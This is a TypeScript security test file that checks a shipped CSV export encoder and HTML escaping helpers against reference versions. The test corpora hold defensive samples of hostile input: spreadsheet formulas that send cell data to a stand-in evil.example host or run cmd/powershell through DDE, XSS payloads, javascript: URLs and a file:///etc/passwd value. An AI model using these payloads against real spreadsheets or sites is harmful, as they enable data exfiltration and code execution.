/**
 * SEC-12x — the encoders that actually ship, as opposed to A10's reference ones.
 *
 * Pass one proved `tests/security/helpers/*.ts`. That proved a design, not a product.
 * These cases run the SAME adversarial corpus through the code that is deployed:
 * A09's `apps/app/src/privacy/csv.ts` and A05's `packages/ui/src/html.ts`.
 *
 * The differential form matters. If the shipped encoder and the reviewed reference ever
 * disagree on a byte, one of them is wrong and the SEC-1xx/SEC-2xx cases stop meaning
 * anything about production.
 */
import { describe, it, expect } from 'vitest';
import { csvCell as shippedCsvCell, csvRow as shippedCsvRow, csvDocument } from '@app/privacy/csv';
import { csvCell as referenceCsvCell } from '../helpers/csv.js';
import { escapeHtml, safeHref } from '../helpers/html.js';
import {
  attrs,
  escapeAttribute,
  render,
  safeHref as safeHrefShipped,
  URL_BEARING_ATTRIBUTES,
  Button,
} from '@verify/ui';
import { html } from 'hono/html';

/** Every payload the reference suite uses, plus the ones exports specifically attract. */
const CSV_CORPUS: readonly (string | number | null | undefined)[] = [
  '=IMPORTXML("https://evil.example/?d="&A1,"//x")',
  '=HYPERLINK("https://evil.example/?"&A1,"Click for refund")',
  '=WEBSERVICE("https://evil.example/?d="&A1)',
  "=cmd|'/c calc'!A0",
  "@SUM(1+1)*cmd|'/c powershell -e ...'!A0",
  '+1+1',
  "-2+3+cmd|'/c calc'!A0",
  '\tTAB leader',
  '\rCR leader',
  '=CONCAT("a","b")',
  'say "hi"',
  'a,b',
  'line1\nline2',
  'line1\r\nline2',
  '"=cmd"',
  'VERIFIED',
  'run_01HZ',
  '-2900',
  '',
  2900,
  0,
  null,
  undefined,
];

describe('A09 export writer vs the reviewed reference', () => {
  it('SEC-1201 the shipped csvCell agrees with the reference on every corpus value', () => {
    const disagreements: string[] = [];
    for (const value of CSV_CORPUS) {
      const shipped = shippedCsvCell(value as never);
      const reference = referenceCsvCell(value ?? null);
      if (shipped !== reference) {
        disagreements.push(`${JSON.stringify(value)}: shipped=${JSON.stringify(shipped)} reference=${JSON.stringify(reference)}`);
      }
    }
    expect(disagreements).toEqual([]);
  });

  it('SEC-1202 the apostrophe lands INSIDE the quotes, which is the whole point', () => {
    // Quote first and the apostrophe sits outside, where Excel ignores it and evaluates the
    // formula in a row that is also malformed. This is the case the split between A02's
    // prefixer and A09's quoter existed to break.
    const out = shippedCsvCell('=CONCAT("a","b")');
    expect(out.startsWith('"\'=')).toBe(true);
    expect(out.endsWith('"')).toBe(true);
    expect(out).not.toMatch(/^'"/);
  });

  it('SEC-1203 every formula leader is neutralised by the shipped encoder', () => {
    for (const leader of ['=', '+', '-', '@', '\t', '\r']) {
      const out = shippedCsvCell(`${leader}payload`);
      const unquoted = out.startsWith('"') ? out.slice(1) : out;
      expect(unquoted.startsWith("'"), JSON.stringify(leader)).toBe(true);
    }
  });

  it('SEC-1204 a hostile CRM value cannot break out of its field into a new record', () => {
    const hostile = '=cmd|\'/c calc\'!A0\r\nattacker,row,injected';
    const row = shippedCsvRow(['run_1', 'FAILED', hostile, 'ok']);
    // The whole hostile value must remain one quoted field: exactly three commas at the
    // top level, and no bare CRLF outside quotes.
    expect(row.split('"').length % 2, 'unbalanced quoting').toBe(1);
    const doc = csvDocument([['a', hostile], ['b', 'c']]);
    // Two records plus the trailing terminator — the injected CRLF stays inside the field.
    expect(doc.split(/\r\n(?=(?:[^"]*"[^"]*")*[^"]*$)/).filter((p) => p.length > 0).length).toBe(2);
  });

  it('SEC-1205 null and undefined become an empty field, never the word "null"', () => {
    expect(shippedCsvCell(null)).toBe('');
    expect(shippedCsvCell(undefined)).toBe('');
    expect(shippedCsvCell('')).toBe('');
  });
});

describe('A05 UI escaping vs the reviewed reference', () => {
  const XSS = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '"><svg onload=alert(1)>',
    "'><iframe srcdoc='<script>alert(1)</script>'>",
    '<details open ontoggle=alert(1)>',
    '</textarea><script>alert(1)</script>',
  ];

  it('SEC-1210 hono/html escapes an interpolated workflow name so no tag survives', async () => {
    for (const payload of XSS) {
      const out = await render(html`<h1>${payload}</h1>`);
      expect(out, payload).not.toMatch(/<(script|img|svg|iframe|details)\b/i);
      expect(out, payload).toContain('&lt;');
    }
  });

  it('SEC-1211 escapeAttribute prevents breakout from a double-quoted attribute', () => {
    for (const payload of XSS) {
      const out = escapeAttribute(payload);
      expect(out, payload).not.toContain('"');
      expect(out, payload).not.toContain('<');
      expect(out, payload).not.toContain('>');
    }
  });

  it('SEC-1212 attrs() refuses an attribute NAME assembled from input', () => {
    // An escaped value in a sane attribute is safe; an attribute whose *name* came from
    // customer input is `onerror` waiting to happen. It must throw, not sanitise.
    expect(() => attrs({ 'onerror=alert(1) x': 'y' })).toThrow(TypeError);
    expect(() => attrs({ 'data-ok': 'value' })).not.toThrow();
  });

  it('SEC-1213 A05 and A10 agree on the five characters that must never survive', () => {
    // A10's reference also escapes backtick and `=`, which matters only for UNQUOTED
    // attributes. A05 always quotes, so the difference is safe — but the five that matter
    // in every context must match exactly, and this pins that.
    for (const ch of ['&', '<', '>', '"', "'"]) {
      expect(escapeAttribute(ch), ch).toBe(escapeHtml(ch));
    }
  });

  it('SEC-1214 a javascript: target cannot reach a rendered href, through any shipped path', async () => {
    // REWRITTEN after A05 shipped the guard. The original body built markup with hono's
    // own `html` tag and then called `render()`, so the only `@verify/ui` symbol under
    // test was `render`, which receives already-finished markup. No change inside
    // `packages/ui` could have made it pass, and the only way to force it green would
    // have been to regex-scrub final HTML in `render()` — false confidence that guards
    // nothing at the point where the URL is written, and which would rewrite legitimate
    // markup. A05 was right to refuse. This exercises the three real entry points.
    //
    // 1. The guard itself.
    expect(safeHrefShipped('javascript:alert(1)')).toBeNull();
    // 2. The backstop for a caller who builds attributes by hand.
    expect(await render(html`<a ${attrs({ href: 'javascript:alert(1)' })}>click</a>`)).not.toContain(
      'javascript:',
    );
    // 3. The component path.
    expect(await render(Button({ label: 'click', href: 'javascript:alert(1)' }))).not.toContain(
      'javascript:',
    );
  });

  it('SEC-1216 every URL-bearing attribute is guarded, not just href', async () => {
    // `src`, `action`, `formaction`, `poster`, `cite`, `data`, `ping`, `xlink:href` all
    // navigate or fetch. Guarding only `href` would leave eight doors open.
    for (const name of URL_BEARING_ATTRIBUTES) {
      const rendered = await render(html`<x ${attrs({ [name]: 'javascript:alert(1)' })} />`);
      expect(rendered, name).not.toContain('javascript:');
    }
    // `data-*` is not a navigation attribute and must NOT be swallowed by a prefix match.
    expect(await render(html`<x ${attrs({ 'data-run': 'run_1' })} />`)).toContain('data-run="run_1"');
  });

  it('SEC-1217 a rejected target is dropped, never rendered inert-but-clickable', async () => {
    const rendered = await render(Button({ label: 'click', href: 'vbscript:msgbox(1)' }));
    expect(rendered).not.toContain('<a ');
    expect(rendered).not.toContain('href=');
    // and the defect is findable in the HTML rather than silently invisible
    expect(rendered).toContain('data-href-rejected="true"');
  });

  it('SEC-1218 A05 and A10 agree on the accept/reject DECISION for every corpus value', () => {
    // The property that matters: two implementations, one verdict. A10 wrote its corpus
    // without reading A05's tests. A disagreement here means one of us is wrong about a
    // scheme, and SEC-105/106/107 would stop describing shipped behaviour.
    // Control characters spelled out, so nothing can be silently 'tidied' in this file.
    const NUL = String.fromCharCode(0);
    const TAB = String.fromCharCode(9);
    const LF = String.fromCharCode(10);
    const DEL = String.fromCharCode(127);
    const corpus = [
      'javascript:alert(1)',
      'JaVaScRiPt:alert(1)',
      'java' + NUL + 'script:alert(1)',
      'java' + TAB + 'script:alert(1)',
      LF + ' javascript:alert(1)',
      ' ' + DEL + 'javascript:alert(1)',
      'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
      'vbscript:msgbox(1)',
      'file:///etc/passwd',
      'blob:https://verify.itisyou.app/x',
      '',
      '   ',
      'https://example.test/a',
      'http://example.test/a',
      'mailto:owner@example.test',
      '/app/runs/run_1',
      '//evil.example/x',
      '?q=1',
      '#main',
      '#javascript:alert(1)',
      'relative/path',
      'https://example.test/?a=1&b=2',
    ];
    const disagreements: string[] = [];
    for (const value of corpus) {
      const mine = safeHref(value) === null;
      const theirs = safeHrefShipped(value) === null;
      if (mine !== theirs) {
        disagreements.push(`${JSON.stringify(value)}: A10 rejects=${mine} A05 rejects=${theirs}`);
      }
    }
    expect(disagreements).toEqual([]);
  });

  it('SEC-1219 the two implementations differ only by escaping, which A05 applies once', () => {
    // DIVERGENCE 1, adjudicated: A05 returns the target UNESCAPED because `attrs()`
    // escapes exactly once at the point that writes the attribute. Escaping in both would
    // double-encode every query string (`?a=1&b=2` -> `&amp;` -> `&amp;amp;`). A05 is
    // right: the guard decides and normalises, the writer escapes. A10's reference keeps
    // escaping because it is a self-contained "produce an attribute value" helper with no
    // writer behind it. Different position in the pipeline, same decision — and this
    // asserts they are byte-identical once the difference is accounted for.
    for (const value of ['https://example.test/?a=1&b=2', '/app/runs/run_1', 'mailto:a@b.test']) {
      const theirs = safeHrefShipped(value);
      expect(theirs, value).not.toBeNull();
      expect(escapeHtml(theirs as string), value).toBe(safeHref(value));
    }
  });

  it('SEC-1215 the reference guard rejects what the UI currently lets through', () => {
    // Kept alongside SEC-1214 so the fix has something to be tested against.
    for (const bad of ['javascript:alert(1)', 'JaVaScRiPt:alert(1)', 'data:text/html,<script>1</script>', 'vbscript:msgbox(1)']) {
      expect(safeHref(bad), bad).toBeNull();
    }
    expect(safeHref('/app/runs/run_1')).toBe('/app/runs/run_1');
    expect(safeHref('https://example.test/a')).toContain('https://example.test/a');
  });
});
